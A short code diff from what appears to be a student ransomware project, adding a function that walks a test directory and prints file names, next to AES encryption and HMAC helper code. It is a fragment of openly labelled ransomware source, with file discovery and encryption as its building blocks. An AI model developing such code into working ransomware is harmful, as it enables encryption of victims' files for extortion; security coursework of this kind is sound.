@@ -5,6 +5,17 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from cryptography.hazmat.primitives import (padding, hashes, hmac)
 
 fileToEncrypt = 'image.jpg'
+root = "C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles"
+path = os.path.join(root, "targetdirectory")
+
+def FindFiles(root, path):
+    # Search through directory
+    for path, subdirs, files in os.walk(root):
+        for name in files:
+            print(os.path.join(path, name))
+    return 0
+
+FindFiles(root, path)
 
 def MyEncryptMac(message, EncKey, HMACKey):
     padder = padding.PKCS7(128).padder()
